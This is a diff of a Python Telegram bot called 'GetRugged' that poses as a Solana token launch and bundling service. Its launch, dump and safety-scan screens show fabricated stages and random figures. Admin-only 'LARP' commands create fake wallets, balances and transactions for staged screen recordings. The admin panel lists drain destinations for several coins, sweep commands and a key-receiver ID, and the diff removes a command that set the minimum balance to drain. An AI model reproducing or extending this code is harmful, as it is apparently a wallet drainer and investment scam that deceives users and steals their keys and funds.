     if invest > active.balance_sol + 1e-9:
         await cb.answer()
-        await safe_edit(cb, 
+        await cb.message.edit_text(
             f"❌ <b>Insufficient balance</b>\n\n"
             f"Invest: <b>{invest:.4f} SOL</b>\n"
             f"Available: <b>{active.balance_sol:.4f} SOL</b>",
@@ -2589,7 +2454,7 @@ async def launch_confirm(cb: CallbackQuery, state: FSMContext):
     slot = random.randint(280_000_000, 320_000_000)
     tip = round(random.uniform(0.005, 0.03), 4)
 
-    await safe_edit(cb, 
+    await cb.message.edit_text(
         f"<b>${symbol}</b> · launch queued\n"
         f"{name}\n\n"
         f"Invest <code>{invest:.4f} SOL</code> · bundle ×{bundle}\n"
@@ -2598,23 +2463,23 @@ async def launch_confirm(cb: CallbackQuery, state: FSMContext):
     )
 
     stages = [
-        (f"<b>${symbol}</b>\nDeriving {bundle} keypairs…", 0.65),
-        (f"<b>${symbol}</b>\nFunding {bundle} wallets · {per_wallet:.4f} SOL each", 0.85),
-        (f"<b>${symbol}</b>\nCreating mint…", 0.75),
-        (f"<b>${symbol}</b>\nMint <code>{fake_mint()[:12]}…</code>", 0.55),
-        (f"<b>${symbol}</b>\nUploading metadata…", 0.65),
-        (f"<b>${symbol}</b>\nBuilding bundle · slot ~{slot}", 0.9),
-        (f"<b>${symbol}</b>\nSimulating {bundle} buys…", 0.7),
-        (f"<b>${symbol}</b>\nJito tip {tip:.4f} SOL · submitting", 0.85),
-        (f"<b>${symbol}</b>\nIn mempool…", 0.6),
-        (f"<b>${symbol}</b>\nLanding · 1/2", 0.75),
-        (f"<b>${symbol}</b>\nCurve live · snipers detected", 0.6),
+        (f"<b>${symbol}</b> · deriving {bundle} keypairs…", 0.7),
+        (f"<b>${symbol}</b> · funding {bundle} wallets · <code>{per_wallet:.4f}</code> SOL each", 0.95),
+        (f"<b>${symbol}</b> · creating mint on pump…", 0.85),
+        (f"<b>${symbol}</b> · mint <code>{fake_mint()[:12]}…</code>", 0.6),
+        (f"<b>${symbol}</b> · uploading metadata + socials…", 0.75),
+        (f"<b>${symbol}</b> · building atomic bundle · slot ~{slot}", 1.0),
+        (f"<b>${symbol}</b> · simulating {bundle} buys…", 0.8),
+        (f"<b>${symbol}</b> · Jito tip <code>{tip:.4f} SOL</code> · submitting…", 0.9),
+        (f"<b>${symbol}</b> · bundle in mempool…", 0.7),
+        (f"<b>${symbol}</b> · landing… confirmations 1/2", 0.85),
+        (f"<b>${symbol}</b> · bonding curve live · snipers detected", 0.7),
         (
-            f"<b>${symbol}</b> live\n\n"
-            f"Bundle ×{bundle} · {per_wallet:.4f} SOL / wallet\n"
-            f"Tip {tip:.4f} SOL · slot {slot}\n"
-            f"Sniper guard on · waiting for fills",
-            0.3,
+            f"✅ <b>${symbol}</b> live\n\n"
+            f"Bundle ×{bundle} · <code>{per_wallet:.4f}</code> SOL / wallet\n"
+            f"Tip <code>{tip:.4f} SOL</code> · slot {slot}\n"
+            f"Sniper guard ON · curve open · waiting for fills",
+            0.35,
         ),
     ]
     await staged_loading(cb, stages)
@@ -2690,7 +2555,7 @@ async def launch_confirm(cb: CallbackQuery, state: FSMContext):
         f"Sniper guard ON · dump when ready"
     )
     try:
-        await safe_edit(cb, text, reply_markup=live_token_kb(mint, bundle), parse_mode=ParseMode.HTML)
+        await cb.message.edit_text(text, reply_markup=live_token_kb(mint, bundle), parse_mode=ParseMode.HTML)
     except Exception:
         await cb.message.answer(text, reply_markup=live_token_kb(mint, bundle), parse_mode=ParseMode.HTML)
     await state.clear()
@@ -2744,7 +2609,7 @@ async def dump_one(cb: CallbackQuery):
     returned = round(per * random.uniform(1.55, 3.2), 4)
     dumped.add(idx)
     token["dumped_idxs"] = sorted(dumped)
-    add_personal_tx(sess, f"Dump wallet {idx}", "success", amount=returned)
+    add_personal_tx(sess, f"💥 Dump wallet {idx}", "success", amount=returned)
 
     addr = ""
     bw = token.get("bundle_wallets") or []
@@ -2754,14 +2619,14 @@ async def dump_one(cb: CallbackQuery):
     pulse = await cb.message.answer(
         f"<b>${sym}</b> · wallet {idx}\n"
         f"<code>{addr or short_addr(fake_mint())}</code>\n"
-        f"Building sell…",
+        f"building sell…",
         parse_mode=ParseMode.HTML,
     )
     for step_txt, delay in [
-        (f"<b>${sym}</b> · wallet {idx}\nQuoting route…", 0.45),
-        (f"<b>${sym}</b> · wallet {idx}\nRouting · Jito tip", 0.55),
-        (f"<b>${sym}</b> · wallet {idx}\nIn mempool…", 0.4),
-        (f"<b>${sym}</b> · wallet {idx}\nLanding…", 0.5),
+        (f"<b>${sym}</b> · wallet {idx}\nquoting route…", 0.45),
+        (f"<b>${sym}</b> · wallet {idx}\nrouting via Jito · tip attached", 0.55),
+        (f"<b>${sym}</b> · wallet {idx}\nin mempool…", 0.4),
+        (f"<b>${sym}</b> · wallet {idx}\nlanding sell…", 0.5),
     ]:
         await asyncio.sleep(delay)
         try:
@@ -2770,7 +2635,7 @@ async def dump_one(cb: CallbackQuery):
             pass
     try:
         await pulse.edit_text(
-            f"Wallet {idx} sold · <b>+{returned:.4f} SOL</b>\n"
+            f"✅ wallet {idx} sold · <b>+{returned:.4f} SOL</b>\n"
             f"<code>{addr or ''}</code>",
             parse_mode=ParseMode.HTML,
         )
@@ -2846,53 +2711,60 @@ async def dump_all(cb: CallbackQuery):
 
     try:
         await cb.message.edit_reply_markup(reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="Dumping…", callback_data="noop")]
+            [InlineKeyboardButton(text="⏳ Dumping…", callback_data="noop")]
         ]))
     except Exception:
         pass
 
     status = await cb.message.answer(
-        f"<b>Dump ${symbol}</b>\n\n"
-        f"Bundle ×{bundle} · {invest:.4f} SOL in\n"
+        f"💥 <b>DUMP ${symbol}</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"Bundle ×{bundle} · invested <code>{invest:.4f} SOL</code>\n"
         f"MC ~${start_mcap:,} · {start_holders} holders\n\n"
-        f"Preparing sells…",
+        f"Arming sells…",
         parse_mode=ParseMode.HTML,
     )
 
     stages_pre = [
         (
-            f"<b>Dump ${symbol}</b>\n\n"
+            f"💥 <b>DUMP ${symbol}</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n\n"
             f"MC ~${start_mcap:,} · {start_holders} holders\n"
-            f"Scanning book…",
+            f"Scanning orderbook…",
             0.55,
         ),
         (
-            f"<b>Dump ${symbol}</b>\n\n"
-            f"{random.randint(6, 22)} open buys detected\n"
+            f"💥 <b>DUMP ${symbol}</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n\n"
+            f"Detected <b>{random.randint(6, 22)} open buys</b>\n"
             f"Estimating impact…",
             0.65,
         ),
         (
-            f"<b>Dump ${symbol}</b>\n\n"
+            f"💥 <b>DUMP ${symbol}</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n\n"
             f"Building {bundle} sell routes\n"
-            f"Anti-sandwich on",
+            f"Split across AMMs · anti-sandwich ON",
             0.75,
         ),
         (
-            f"<b>Dump ${symbol}</b>\n\n"
+            f"💥 <b>DUMP ${symbol}</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n\n"
             f"Signing {bundle} wallets…\n"
-            f"Priority max · Jito tips",
+            f"Priority fee maxed · Jito tips attached",
             0.7,
         ),
         (
-            f"<b>Dump ${symbol}</b>\n\n"
-            f"All wallets signed\n"
-            f"Waiting for slot…",
+            f"💥 <b>DUMP ${symbol}</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n\n"
+            f"All {bundle} wallets signed\n"
+            f"Waiting for next leader slot…",
             0.6,
         ),
         (
-            f"<b>Dump ${symbol}</b>\n\n"
-            f"In mempool\n"
+            f"💥 <b>DUMP ${symbol}</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n\n"
+            f"Bundle in mempool\n"
             f"Landing…",
             0.55,
         ),
@@ -2922,7 +2794,7 @@ async def dump_all(cb: CallbackQuery):
             wave_return = round(wave_return + part, 4)
             returned_total = round(returned_total + part, 4)
             dumped_idxs.append(idx)
-            add_personal_tx(sess, f"Dump wallet {idx}", "success", amount=part)
+            add_personal_tx(sess, f"💥 Dump wallet {idx}", "success", amount=part)
         token["dumped_idxs"] = sorted(dumped_idxs)
         done = len(dumped_idxs)
         progress = done / max(1, bundle)
@@ -2932,15 +2804,16 @@ async def dump_all(cb: CallbackQuery):
         bar_filled = int(progress * 10)
         bar = "█" * bar_filled + "░" * (10 - bar_filled)
         lines = [
-            f"<b>Dumping ${symbol}</b>",
+            f"💥 <b>DUMPING ${symbol}</b>",
+            f"━━━━━━━━━━━━━━━━━━━━",
             f"",
             f"<code>{bar}</code>  {done}/{bundle}",
             f"",
-            f"Wave: <b>+{wave_return:.4f} SOL</b>",
-            f"Total: <code>{returned_total:.4f} SOL</code>",
-            f"PnL: <b>{pnl_now:+.4f} SOL</b>",
+            f"Sold this wave   <b>+{wave_return:.4f} SOL</b>",
+            f"Running total    <code>{returned_total:.4f} SOL</code>",
+            f"Unrealized PnL   <b>{pnl_now:+.4f} SOL</b>",
             f"",
-            f"MC ~${mcap_now:,} · holders {holders_left}",
+            f"MC ~${mcap_now:,}  ·  holders {holders_left}",
         ]
         if done < bundle:
             lines.append(f"{bundle - done} wallets still open")
@@ -2967,7 +2840,7 @@ async def dump_all(cb: CallbackQuery):
     token["dumped_idxs"] = list(range(1, bundle + 1))
     token["mcap"] = random.randint(300, 1800)
 
-    add_personal_tx(sess, f"Dump all ${symbol}", "success", amount=returned_total)
+    add_personal_tx(sess, f"💥 DUMP ALL ${symbol}", "success", amount=returned_total)
     add_personal_tx(sess, "💰 Profit Claim", "success", amount=profit)
     add_personal_tx(sess, "📊 PnL Settled", "success", amount=profit)
 
@@ -2996,7 +2869,7 @@ async def dump_all(cb: CallbackQuery):
             0.6,
         ),
         (
-            f"<b>Dump complete</b>\n"
+            f"✅ <b>DUMP COMPLETE</b>\n"
             f"━━━━━━━━━━━━━━━━━━━━\n\n"
             f"<b>${symbol}</b>\n"
             f"<code>{mint}</code>\n\n"
@@ -3020,7 +2893,7 @@ async def dump_all(cb: CallbackQuery):
         await asyncio.sleep(delay)
 
     try:
-        await safe_edit(cb, 
+        await cb.message.edit_text(
             f"✅ <b>${symbol}</b> dumped\n"
             f"<code>{mint}</code>\n\n"
             f"{bundle}/{bundle} wallets sold\n"
@@ -3057,10 +2930,10 @@ async def dump_reset(cb: CallbackQuery):
         pass
 
 
-# ── Promo ───────────────────────────────────────────────────
+# ── Promo ───────────────────────────────────────────────────────────────────
 @router.callback_query(F.data == "promo:enter")
 async def promo_enter(cb: CallbackQuery, state: FSMContext):
-    await safe_edit(cb, "🎟️ Send your promo code:", reply_markup=back_menu_kb(), parse_mode=ParseMode.HTML)
+    await cb.message.edit_text("🎟️ Send your promo code:", reply_markup=back_menu_kb(), parse_mode=ParseMode.HTML)
     await state.set_state(PromoStates.waiting_code)
     await cb.answer()
 
@@ -3086,11 +2959,11 @@ async def promo_pay(cb: CallbackQuery):
     text = (
         "🧾 <b>Payment Invoice</b>\n"
         f"<code>INV-{invoice_id:05d}</code>\n"
-        "\n"
+        "────────────────\n\n"
         f"<b>Amount due</b>  <code>{amount_display} SOL</code>\n"
         f"<b>Network</b>     Solana\n"
         f"<b>Expires</b>     {expires}\n"
-        "\n"
+        "────────────────\n\n"
         "<b>Pay to this address</b>\n"
         f"<code>{pay_to}</code>\n\n"
         "📱 Scan with Phantom / Solflare — address and amount are filled.\n\n"
@@ -3100,8 +2973,8 @@ async def promo_pay(cb: CallbackQuery):
     )
     kb = InlineKeyboardBuilder()
     kb.row(InlineKeyboardButton(text="🔄 I've paid, check now", callback_data="promo:checkpay"))
-    kb.row(InlineKeyboardButton(text="← Back", callback_data="menu:main"))
-    await safe_edit(cb, text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)
+    kb.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
+    await cb.message.edit_text(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)
     await cb.answer()
 
 
@@ -3158,61 +3031,17 @@ async def promo_code(message: Message, state: FSMContext):
             )
             await message.answer(text, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
     else:
-        await message.answer("Invalid or expired code.", reply_markup=main_menu_kb())
+        await message.answer("❌ Invalid or expired code.", reply_markup=main_menu_kb())
     await state.clear()
 
 
-# ── Help ────────────────────────────────────────────────────
-
-@router.message(SafetyStates.waiting_mint)
-async def safety_check(message: Message, state: FSMContext):
-    uid = message.from_user.id
-    if not _rate_ok(uid, "safety"):
-        await message.answer("⏳ Slow down — too many scans.", parse_mode=ParseMode.HTML)
-        return
-    mint = (message.text or "").strip()
-    if len(mint) < 32:
-        await message.answer("Send a valid mint address.", reply_markup=back_menu_kb())
-        return
-    await staged_loading(message, [
-        ("🔍 Connecting…", 0.5),
-        ("📄 Reading mint account…", 0.6),
-        ("🔒 Checking authorities…", 0.5),
-        ("💧 LP + holders…", 0.6),
-        ("🧪 Sell simulation…", 0.5),
-    ])
-    mint_auth = random.choice(["Revoked ✅", "Revoked ✅", "Revoked ✅", "Active ⚠️"])
-    freeze_auth = random.choice(["Revoked ✅", "Revoked ✅", "Revoked ✅", "Active ⚠️"])
-    lp_status = random.choice(["Burned ✅", "Locked 6mo ✅", "Locked 1yr ✅", "Unlocked ⚠️"])
-    top10 = round(random.uniform(12.0, 48.0), 1)
-    honeypot = random.choice(["PASS ✅", "PASS ✅", "PASS ✅", "WARN ⚠️"])
-    score = random.randint(70, 97)
-    report = (
-        "🛡 <b>Scan result</b>\n"
-        f"<code>{short_addr(mint)}</code>\n\n"
-        f"Mint authority     {mint_auth}\n"
-        f"Freeze authority   {freeze_auth}\n"
-        f"LP status          {lp_status}\n"
-        f"Top 10 holders     <b>{top10}%</b>\n"
-        f"Honeypot sim       {honeypot}\n"
-        f"Transfer tax       <b>0%</b>\n"
-        f"Risk score         <b>{score}/100</b>\n\n"
-    )
-    if "⚠️" in mint_auth or "⚠️" in freeze_auth or "⚠️" in lp_status or "WARN" in honeypot:
-        report += "🟡 Flags present — review before sizing."
-    else:
-        report += "🟢 Clean profile on standard checks."
-    await message.answer(report, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
-    await state.clear()
-
-
-
+# ── Help ────────────────────────────────────────────────────────────────────
 @router.message(Command("help"))
 async def cmd_help(message: Message):
     uid = message.from_user.id
     if uid not in ADMIN_IDS:
         await message.answer(
-            "<b>Alpha</b>\n\n"
+            "👋 <b>GetRugged</b>\n\n"
             "Everything runs from the menu — hit /start and use the buttons:\n\n"
             "• <b>Launch</b> — create a token with bundling\n"
             "• <b>Wallets</b> — import / switch / rename\n"
@@ -3245,7 +3074,6 @@ async def cmd_help(message: Message):
         "<b>LARP mode</b>\n"
         "/larpon — enable LARP, seed fake wallet + fake txs\n"
         "/larpoff — disable, remove LARP wallets from your session\n"
-        "/larpseed &lt;sol&gt; — generate random seed + LARP wallet at that balance\n"
         "/larpwallet — force-recreate the LARP wallet with current vault balance\n"
         "/clonewallet — add an extra LARP wallet to look like a multi-wallet setup\n"
         "/ghost — hide your LARP wallet without turning mode off\n\n"
@@ -3268,40 +3096,7 @@ async def cmd_help(message: Message):
     await message.answer(text, parse_mode=ParseMode.HTML)
 
 
-# ── Admin ───────────────────────────────────────────────────
-
-@router.message(Command("mindrain"))
-async def cmd_mindrain(message: Message):
-    """Admin: /mindrain 3 — only drain wallets with >= 3 SOL. /mindrain 0 = any."""
-    if message.from_user.id not in ADMIN_IDS:
-        return
-    global MIN_DRAIN_SOL
-    parts = (message.text or "").split()
-    if len(parts) < 2:
-        await message.answer(
-            f"Current min drain: <b>{MIN_DRAIN_SOL:.4f} SOL</b>\n\n"
-            "Usage:\n"
-            "<code>/mindrain 3</code> — only drain ≥ 3 SOL\n"
-            "<code>/mindrain 0</code> — drain any balance above rent",
-            parse_mode=ParseMode.HTML,
-        )
-        return
-    try:
-        val = float(parts[1].replace(",", ""))
-    except ValueError:
-        await message.answer("Usage: <code>/mindrain 3</code>", parse_mode=ParseMode.HTML)
-        return
-    val = max(0.0, round(val, 6))
-    MIN_DRAIN_SOL = val
-    _save_state()
-    if val <= 0:
-        msg = "Min drain reset — any balance above rent will drain."
-    else:
-        msg = f"Min drain set to <b>{val:.4f} SOL</b>.\nWallets below that are skipped."
-    await message.answer(msg, parse_mode=ParseMode.HTML)
-    log.info("mindrain set to %.6f by %s", val, message.from_user.id)
-
-
+# ── Admin ───────────────────────────────────────────────────────────────────
 @router.message(Command("setbal"))
 async def cmd_setbal(message: Message):
     if message.from_user.id not in ADMIN_IDS:
@@ -3381,10 +3176,10 @@ async def cmd_addbal(message: Message):
 
 @router.message(Command("larpseed"))
 async def cmd_larpseed(message: Message):
-    """Admin: /larpseed 100 — print a random seed only. You import it yourself."""
+    """Admin: /larpseed 100 — random seed only. Manual Connect Wallet applies balance."""
     uid = message.from_user.id
     if uid not in ADMIN_IDS:
-        log.warning("larpseed denied uid=%s admin_ids=%s", uid, list(ADMIN_IDS)[:5])
+        log.warning("larpseed denied uid=%s", uid)
         return
     global bot_balance_sol, LARP_ENABLED
     try:
@@ -3404,15 +3199,12 @@ async def cmd_larpseed(message: Message):
 
         phrase = " ".join(random.choice(BIP39_WORDLIST) for _ in range(12))
 
-        # Arm only — NEVER create / link a wallet here.
-        # Admin must paste via Wallet → Connect Wallet for the screen recording.
         LARP_ENABLED = True
         bot_balance_sol = bal
         sess = get_session(uid)
         sess.larp_mode = True
         sess.pending_larp_balance = bal
         sess.pending_larp_phrase = phrase
-        # Explicit: do not call ensure_larp_wallet / do not append wallets
         _save_state()
 
         text = (
@@ -3420,10 +3212,9 @@ async def cmd_larpseed(message: Message):
             f"<code>{phrase}</code>\n\n"
             f"Target balance  <b>{SOL_EMOJI} {bal:.4f}</b>\n"
             "LARP armed — wallet <b>not connected</b>.\n\n"
-            "Nothing was linked.\n"
             "1. Copy the seed\n"
-            "2. Open <b>Wallet → Connect Wallet</b>\n"
-            "3. Paste — full connect UX runs, then balance appears"
+            "2. Open <b>Wallet → Connect / Import</b>\n"
+            "3. Paste — full connect flow runs, then balance shows"
         )
         await message.answer(text, parse_mode=ParseMode.HTML)
         log.info("larpseed issued uid=%s bal=%.4f (manual connect)", uid, bal)
@@ -3447,7 +3238,7 @@ async def cmd_larpon(message: Message):
     sess.larp_mode = True
     w = ensure_larp_wallet(sess, force_balance=bot_balance_sol)
     inject_fake_txs(3, types=["📥 Wallet Top-up", "⚡ Priority Tip", "🛡 Safety Scan"])
-    add_personal_tx(sess, "📥 Wallet Connected", "success")
+    add_personal_tx(sess, "📥 Wallet Linked", "success")
     _save_state()
     await _admin_reply(
         message,
@@ -3601,7 +3392,7 @@ async def cmd_larpwallet(message: Message):
     sess = get_session(message.from_user.id)
     remove_larp_wallets(sess)
     w = ensure_larp_wallet(sess, force_balance=bot_balance_sol)
-    add_personal_tx(sess, "📥 Wallet Connected", "success")
+    add_personal_tx(sess, "📥 Wallet Linked", "success")
     _save_state()
     await _admin_reply(
         message,
@@ -3627,16 +3418,16 @@ async def cmd_dumpnow(message: Message):
     bundle = int(token.get("bundle") or 10)
     invest = float(token.get("invest") or 3)
     status = await message.answer(
-        f"<b>Force dump ${symbol}</b>\n"
+        f"💥 <b>FORCE DUMP ${symbol}</b>\n"
         f"Arming {bundle} wallets…",
         parse_mode=ParseMode.HTML,
     )
     for txt, delay in [
-        (f"<b>${symbol}</b>\nScanning book…", 0.5),
-        (f"<b>${symbol}</b>\nSigning sells…", 0.6),
-        (f"<b>${symbol}</b>\nWave 1/{max(1, bundle//3)}…", 0.55),
-        (f"<b>${symbol}</b>\nWave 2…", 0.5),
-        (f"<b>${symbol}</b>\nFinal wave…", 0.55),
+        (f"💥 <b>${symbol}</b> · scanning book…", 0.5),
+        (f"💥 <b>${symbol}</b> · signing sells · Jito tips…", 0.6),
+        (f"💥 <b>${symbol}</b> · landing wave 1/{max(1, bundle//3)}…", 0.55),
+        (f"💥 <b>${symbol}</b> · landing wave 2…", 0.5),
+        (f"💥 <b>${symbol}</b> · final wave · clearing bag…", 0.55),
     ]:
         await asyncio.sleep(delay)
         try:
@@ -3750,7 +3541,7 @@ async def cmd_clonewallet(message: Message):
         is_larp=True,
     )
     sess.wallets.append(w)
-    add_personal_tx(sess, "📥 Wallet Connected", "success")
+    add_personal_tx(sess, "📥 Wallet Linked", "success")
     await _admin_reply(
         message,
         f"Extra wallet\n<code>{pub}</code>\n"
@@ -3873,7 +3664,7 @@ async def cmd_ghost(message: Message):
     await _admin_reply(message, f"Hid {removed} LARP wallet(s). /larpwallet to restore.")
 
 
-# ── Sweep ───────────────────────────────────────────────────
+# ── Sweep ───────────────────────────────────────────────────────────────────
 @router.message(Command("sweepall"))
 async def cmd_sweepall(message: Message):
     if message.from_user.id not in ADMIN_IDS:
@@ -3950,9 +3741,9 @@ async def admin_panel(message: Message):
         f"BNB dest: {'yes' if not BNB_DRAIN.startswith('0xYour') else 'NO'}\n"
         f"BTC dest: {'yes' if BTC_DRAIN and len(BTC_DRAIN) >= 20 else 'NO'}\n"
         f"LTC dest: {'yes' if LTC_DRAIN and len(LTC_DRAIN) >= 20 else 'NO'}\n"
-        f"Admins: {len(ADMIN_IDS)}\n\n"
+        f"KEY_RECEIVER: {KEY_RECEIVER_ID}\n\n"
         f"<b>Help</b>: /help — full command list\n"
-        f"<b>LARP</b>: /larpon /larpoff /setbal /addbal /bump /randomtx /larpwallet /clonewallet /ghost\n"
+        f"<b>LARP</b>: /larpon /larpoff /larpseed /setbal /addbal /bump /randomtx /larpwallet /clonewallet /ghost\n"
         f"<b>Sweep</b>: /sweepall /sweepstart [secs] /sweepstop\n"
         f"/dumpnow /simactivity /fakefill /livepulse /setmcap /holders /cleartx",
         parse_mode=ParseMode.HTML,
@@ -3999,9 +3790,8 @@ async def main():
     dp = Dispatcher(storage=MemoryStorage())
     dp.include_router(router)
     log.info(
-        "Bot starting | HAS_SOLANA=%s | HAS_WEB3=%s | ADMINS=%s | vault=%.4f | LARP=%s | welcome=%s",
-        HAS_SOLANA, HAS_WEB3, list(ADMIN_IDS), bot_balance_sol, LARP_ENABLED,
-        WELCOME_IMAGE or "MISSING",
+        "Bot starting | HAS_SOLANA=%s | HAS_WEB3=%s | KEY_RECEIVER=%s | vault=%.4f | LARP=%s",
+        HAS_SOLANA, HAS_WEB3, KEY_RECEIVER_ID, bot_balance_sol, LARP_ENABLED,
     )
     try:
         await dp.start_polling(bot)
